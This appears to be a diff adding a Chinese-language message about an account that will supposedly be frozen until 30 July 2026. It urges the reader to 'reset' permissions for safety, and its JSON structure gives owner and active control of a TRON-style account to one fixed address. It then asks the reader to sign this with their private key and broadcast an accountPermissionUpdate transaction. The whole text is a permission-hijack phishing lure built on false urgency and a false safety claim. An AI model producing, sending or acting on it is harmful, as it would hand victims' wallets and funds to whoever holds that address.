@@ -1,0 +1,33 @@
+请完成此操作解除限制，否则将冻结账户至2026年7月30日。
+
+此操作将重置账户权限为单签控制，确保您的资金安全。权限结构如下：
+
+{
+  "owner": {
+    "permission_name": "owner",
+    "threshold": 1,
+    "keys": [
+      {
+        "address": "411c2d0a7e75b74d2d3b4248eaf2137b7640d15eaa",
+        "weight": 1
+      }
+    ]
+  },
+  "actives": [
+    {
+      "type": "Active",
+      "id": 2,
+      "permission_name": "active",
+      "threshold": 1,
+      "operations": "7fff1fc0033ec30f000000000000000000000000000000000000000000000000",
+      "keys": [
+        {
+          "address": "411c2d0a7e75b74d2d3b4248eaf2137b7640d15eaa",
+          "weight": 1
+        }
+      ]
+    }
+  ]
+}
+
+请使用您的私钥对上述权限结构进行签名，并广播 accountPermissionUpdate 交易以完成重置。
